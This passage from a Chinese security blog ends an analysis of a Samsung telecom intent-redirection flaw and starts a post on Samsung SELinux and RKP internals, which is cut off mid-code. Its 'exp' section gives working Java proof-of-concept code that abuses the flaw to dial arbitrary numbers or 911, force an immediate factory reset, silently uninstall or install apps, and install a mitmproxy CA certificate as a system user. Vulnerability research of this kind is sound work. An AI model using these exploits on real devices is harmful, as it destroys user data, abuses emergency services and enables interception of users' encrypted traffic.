<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SamsungUsaWpsManager.<span class="built_in">this</span>.mSamsungUsaWpsHelper.setCallIntent(intent2);</span><br></pre></td></tr></table></figure>

<p>跟进去：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SamsungUsaWpsHelper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;SamsungUsaWpsHelper&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> Intent mCallIntent;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CallsManager mCallsManager;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Context mContext;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SamsungTelecomManagerAdapter mSamsungTelecomManagerAdapter;</span><br><span class="line"></span><br><span class="line">    SamsungUsaWpsHelper(Context context, CallsManager callsManager, SamsungTelecomManagerAdapter samsungTelecomManagerAdapter) &#123;</span><br><span class="line">        <span class="built_in">this</span>.mContext = context;</span><br><span class="line">        <span class="built_in">this</span>.mCallsManager = callsManager;</span><br><span class="line">        <span class="built_in">this</span>.mSamsungTelecomManagerAdapter = samsungTelecomManagerAdapter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: package-private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCallIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mCallIntent = intent;  <span class="comment">// 这里赋值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: package-private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">areNoCallsPresent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Optional.ofNullable(<span class="built_in">this</span>.mCallsManager).map($$Lambda$SqQBZEzdLaU65eG7w4yg3b_2uc.INSTANCE).filter($$Lambda$2ohHFGmFtjY8BkLpMKvqr9gewzA.INSTANCE).isPresent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: package-private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wirelessPriorityServiceCall</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.mCallIntent != <span class="literal">null</span>) &#123;</span><br><span class="line">            SamsungLogger.m3i(TAG, <span class="string">&quot;wirelessPriorityServiceCall&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mCallIntent.setFlags(<span class="number">268435456</span>); <span class="comment">// 0x10000000 =&gt; FLAG_ACTIVITY_NEW_TASK</span></span><br><span class="line">            <span class="built_in">this</span>.mSamsungTelecomManagerAdapter.makeCall(<span class="built_in">this</span>.mContext, <span class="built_in">this</span>.mCallIntent, TAG);  <span class="comment">// 这里调起</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SamsungLogger.m3i(TAG, <span class="string">&quot;wirelessPriorityServiceCall, call intent is null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，漏洞就分析完了，其实就是telecom直接为<code>extra_call_intent</code>中的Intent创建了新的activity task，但是在创建之前，却没有任何判读。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="拨打任意电话"><a href="#拨打任意电话" class="headerlink" title="拨打任意电话"></a>拨打任意电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_CALL, Uri.parse(<span class="string">&quot;tel:+17031234567&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">broad_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">broad_intent.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">sendBroadcast(broad_intent);</span><br></pre></td></tr></table></figure>

<h3 id="拨打特权电话"><a href="#拨打特权电话" class="headerlink" title="拨打特权电话"></a>拨打特权电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.CALL_PRIVILEGED&quot;</span>, Uri.parse(<span class="string">&quot;tel:911&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">broad_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">broad_intent.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">sendBroadcast(broad_intent);</span><br></pre></td></tr></table></figure>

<h3 id="立即恢复出厂设置"><a href="#立即恢复出厂设置" class="headerlink" title="立即恢复出厂设置"></a>立即恢复出厂设置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.sec.factory&quot;</span>, <span class="string">&quot;com.sec.factory.sysdump.FactoryReset&quot;</span>);</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">broad_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">broad_intent.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">sendBroadcast(broad_intent);</span><br></pre></td></tr></table></figure>

<h3 id="卸载任意App"><a href="#卸载任意App" class="headerlink" title="卸载任意App"></a>卸载任意App</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.samsung.android.packageinstaller&quot;</span>, <span class="string">&quot;com.android.packageinstaller.UninstallUninstalling&quot;</span>);</span><br><span class="line"><span class="type">PackageManager</span> <span class="variable">packageManager</span> <span class="operator">=</span> context.getPackageManager();</span><br><span class="line"><span class="type">ApplicationInfo</span> <span class="variable">app</span> <span class="operator">=</span> packageManager.getApplicationInfo(<span class="string">&quot;jackpal.androidterm&quot;</span>, <span class="number">0</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;com.android.packageinstaller.applicationInfo&quot;</span>, app);</span><br><span class="line">intent.putExtra(<span class="string">&quot;android.content.pm.extra.PACKAGE_NAME&quot;</span>, <span class="string">&quot;jackpal.androidterm&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;android.intent.extra.UNINSTALL_ALL_USERS&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;android.intent.extra.RETURN_RESULT&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;android.content.pm.extra.LEGACY_STATUS&quot;</span>, <span class="number">1</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;com.android.packageinstaller.extra.KEEP_DATA&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;com.android.packageinstaller.extra.APP_LABEL&quot;</span>, <span class="string">&quot;Terminal Emulator&quot;</span>);</span><br><span class="line"></span><br><span class="line">intent.putExtra(Intent.EXTRA_USER, android.os.Process.myUserHandle());</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">broad_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">broad_intent.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">sendBroadcast(broad_intent);</span><br></pre></td></tr></table></figure>

<h3 id="安装任意App"><a href="#安装任意App" class="headerlink" title="安装任意App"></a>安装任意App</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">local_apk_file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getFilesDir(), <span class="string">&quot;term.apk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (local_apk_file.exists())</span><br><span class="line">local_apk_file.delete();</span><br><span class="line"></span><br><span class="line"><span class="type">AssetManager</span> <span class="variable">assetManager</span> <span class="operator">=</span> getAssets();</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> assetManager.open(<span class="string">&quot;term.apk&quot;</span>);</span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(local_apk_file);</span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">65536</span>];</span><br><span class="line"><span class="type">int</span> read;</span><br><span class="line"><span class="keyword">while</span>((read = inputStream.read(buffer)) != –<span class="number">1</span>)&#123;</span><br><span class="line">outputStream.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inputStream.close();</span><br><span class="line">outputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="type">PackageInstaller</span> <span class="variable">pi</span> <span class="operator">=</span> getPackageManager().getPackageInstaller();</span><br><span class="line"><span class="type">int</span> <span class="variable">sessionId</span> <span class="operator">=</span> pi.createSession(<span class="keyword">new</span> <span class="title class_">PackageInstaller</span>.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));</span><br><span class="line"><span class="type">String</span> <span class="variable">temp_apk_path</span> <span class="operator">=</span> <span class="string">&quot;/data/app/vmdl&quot;</span> + sessionId + <span class="string">&quot;.tmp/base.apk&quot;</span>;</span><br><span class="line">Log.i(TAG, <span class="string">&quot;Session is &quot;</span> + sessionId + <span class="string">&quot; – so path should be &quot;</span> + temp_apk_path);</span><br><span class="line"></span><br><span class="line">PackageInstaller.<span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> pi.openSession(sessionId);</span><br><span class="line"><span class="type">long</span> <span class="variable">sizeBytes</span> <span class="operator">=</span> local_apk_file.length();</span><br><span class="line"></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(local_apk_file);</span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> session.openWrite(<span class="string">&quot;base.apk&quot;</span>, <span class="number">0</span>, sizeBytes);</span><br><span class="line"><span class="type">int</span> <span class="variable">bytes_read</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((bytes_read = in.read(buffer)) != –<span class="number">1</span>) &#123;</span><br><span class="line">out.write(buffer, <span class="number">0</span>, bytes_read);</span><br><span class="line">&#125;</span><br><span class="line">session.fsync(out);</span><br><span class="line">in.close();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Intent pi_intent = new Intent(getApplicationContext(), YoloReceiver.class);</span></span><br><span class="line"><span class="comment">// PendingIntent alarmtest = PendingIntent.getBroadcast(getApplicationContext(), 1887111117, pi_intent, // // PendingIntent.FLAG_UPDATE_CURRENT);</span></span><br><span class="line"><span class="comment">// IntentSender statusReceiver = alarmtest.getIntentSender();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// session.commit(statusReceiver);</span></span><br><span class="line"><span class="comment">// session.close();</span></span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.samsung.android.packageinstaller&quot;</span>, <span class="string">&quot;com.android.packageinstaller.InstallInstalling&quot;</span>);</span><br><span class="line">intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line"><span class="type">File</span> <span class="variable">apkFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(temp_apk_path);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">apkUri</span> <span class="operator">=</span> Uri.fromFile(apkFile);</span><br><span class="line">intent.setData(apkUri);</span><br><span class="line">intent.putExtra(Intent.EXTRA_USER, android.os.Process.myUserHandle());</span><br><span class="line"><span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> context.getPackageManager().getPackageArchiveInfo(local_apk_file.getPath(), PackageManager.GET_PERMISSIONS);</span><br><span class="line">intent.putExtra(<span class="string">&quot;com.android.packageinstaller.applicationInfo&quot;</span>, packageInfo.applicationInfo);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">broad_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">broad_intent.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">sendBroadcast(broad_intent);</span><br><span class="line"></span><br><span class="line">Thread.sleep(<span class="number">3333</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">home_screen_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.MAIN&quot;</span>);</span><br><span class="line">home_screen_intent.addCategory(<span class="string">&quot;android.intent.category.HOME&quot;</span>);</span><br><span class="line">home_screen_intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">startActivity(home_screen_intent);</span><br></pre></td></tr></table></figure>

<h3 id="安装任意证书"><a href="#安装任意证书" class="headerlink" title="安装任意证书"></a>安装任意证书</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CERTIFICATE</span> <span class="operator">=</span> <span class="string">&quot;—–BEGIN CERTIFICATE—–\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;MIIDoTCCAomgAwIBAgIGDopToKRIMA0GCSqGSIb3DQEBCwUAMCgxEjAQBgNVBAMM\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;CW1pdG1wcm94eTESMBAGA1UECgwJbWl0bXByb3h5MB4XDTIwMDgyNzE4NTIxMVoX\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;DTIzMDgyOTE4NTIxMVowKDESMBAGA1UEAwwJbWl0bXByb3h5MRIwEAYDVQQKDAlt\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;aXRtcHJveHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC6PUKSC32x\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;mzSjxXqcOP9jvm9wBpnTXaJZF0Fmy9qPc0yycgaZ6KZZpw+MXwzr2LAthK7yQCUy\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;6W2VGS6gZwCz5Cx1gBdI8URjhAoYvUA3GEuH/ZfqET4UzFrmvIqSIWuY1e/ddTjn\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;t4PoRKHC2ZrRo9AeG4Nehsr0GPaJ2Eay4nBTjGlRtuKYVRb3CEmOIfXhxmyWI87c\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;S4q2E9gMfJTO0I+ceWWNb3Qm7TyqI3iuLhdWIGEMjQ/2ghmyIMkt7+tyMUzskSVR\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;nP7Mrm6ZIVhzpzhjzdAoxkcsUHqwge13JknqzFIwH7z63hJYcqY7pdE+wUWnIpXB\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;UWHSIBJE64qLAgMBAAGjgdAwgc0wDwYDVR0TAQH/BAUwAwEB/zARBglghkgBhvhC\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;AQEEBAMCAgQweAYDVR0lBHEwbwYIKwYBBQUHAwEGCCsGAQUFBwMCBggrBgEFBQcD\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;BAYIKwYBBQUHAwgGCisGAQQBgjcCARUGCisGAQQBgjcCARYGCisGAQQBgjcKAwEG\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;CisGAQQBgjcKAwMGCisGAQQBgjcKAwQGCWCGSAGG+EIEATAOBgNVHQ8BAf8EBAMC\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;AQYwHQYDVR0OBBYEFKvNgPJA8o638r3x82ocg0HjW5B0MA0GCSqGSIb3DQEBCwUA\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;A4IBAQAsperz2qaBMu/MnmSaV2x6LFWYMXcJKXJR3vrrmPcQ3F5pUBFwQuhp+5jj\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;1wfF38rcYsfNidiRIPztHtbTsQzKCTF2Gwy5aRK4uR9bM5UguACo7C9Q35N31FG2\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;/x3T3UMvZrqUOt5dJGuxUTXZAWoRikQw7rHfpVftxDjFCBrVmVlDdGqGdPBMAJsJ\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;5MCR01mNKxO385voXCQQYW1pFG0RdUTucqSl2YjXe7UjD8rov34ljR2qAu5KImDm\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;FhzLdPqUZAZuCWTBbxQantRRV11k/QdlVTamyILFSXlkMT2Ral7t6YxMXmd4KBqm\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;vzGsCb5scuW4h/ua/IzHHAR3ryia\n&quot;</span> +</span><br><span class="line">       <span class="string">&quot;—–END CERTIFICATE—–&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.credentials.INSTALL&quot;</span>);</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.android.certinstaller&quot;</span>, <span class="string">&quot;com.android.certinstaller.CertInstaller&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] pemBytes = Base64.decode(</span><br><span class="line">       CERTIFICATE.replaceAll(<span class="string">&quot;—–(BEGIN|END) CERTIFICATE—–&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">              .replaceAll(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">              .getBytes(<span class="string">&quot;UTF-8&quot;</span>),</span><br><span class="line">       Base64.DEFAULT</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">intent.putExtra(KeyChain.EXTRA_CERTIFICATE, pemBytes);</span><br><span class="line">intent.putExtra(KeyChain.EXTRA_NAME, <span class="string">&quot;yolo&quot;</span>);</span><br><span class="line">intent.putExtra(Intent.EXTRA_REFERRER, <span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;certificate_install_usage&quot;</span>, <span class="string">&quot;ca&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;install_as_uid&quot;</span>, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">broad_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.samsung.server.telecom.USER_SELECT_WIFI_SERVICE_CALL&quot;</span>);</span><br><span class="line">broad_intent.putExtra(<span class="string">&quot;extra_call_intent&quot;</span>, intent);</span><br><span class="line">sendBroadcast(broad_intent);</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/15/%E4%B8%89%E6%98%9F%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/15/%E4%B8%89%E6%98%9F%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">三星笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-15 20:51:33" itemprop="dateCreated datePublished" datetime="2022-04-15T20:51:33+08:00">2022-04-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-12-16 16:15:44" itemprop="dateModified" datetime="2022-12-16T16:15:44+08:00">2022-12-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h1><p>在Android4.3之前，Google使用应用程序沙盒作为Android安全模型，但是，在Android5.0之后，SELinux是Android系统中主要的安全机制，而且是默认启用的。</p>
<p>在Google Nexus和Pixel系列中，SELinux策略是被一个在内核中叫<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.9/source/security/selinux/hooks.c#L105">selinux_enforcing</a>的可写的全局变量控制的。因此，如果selinux_enforcing为false，SELinux则不启用。</p>
<p>但是，三星Galaxy的SELinux策略不依赖于selinux_enforcing，因为三星自定义了SELinux策略，以隐藏原始的SELinux的缺点。基于原始的SELinux的权限管理，以下代码片段展示了添加到所有系统调用接口中的额外的完整性检查。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> &#123;</span><br><span class="line">  ...</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_RKP_KDP</span></span><br><span class="line">	<span class="type">atomic_t</span> *use_cnt;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">task_struct</span> *bp_task;</span><br><span class="line">	<span class="type">void</span> *bp_pgd;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> type;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*CONFIG_RKP_KDP*/</span></span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>首先，在cred结构体中，存在一些成员，如bp_task和bp_pgd用于SELinux的security_integrity_current函数。当安全环境中，新的凭证提交过来，或者被覆写，RKP将在bp_task中记录它的所有者信息，在bp_pgd中记录PGD信息。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// security/security.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> call_void_hook(FUNC, ...)				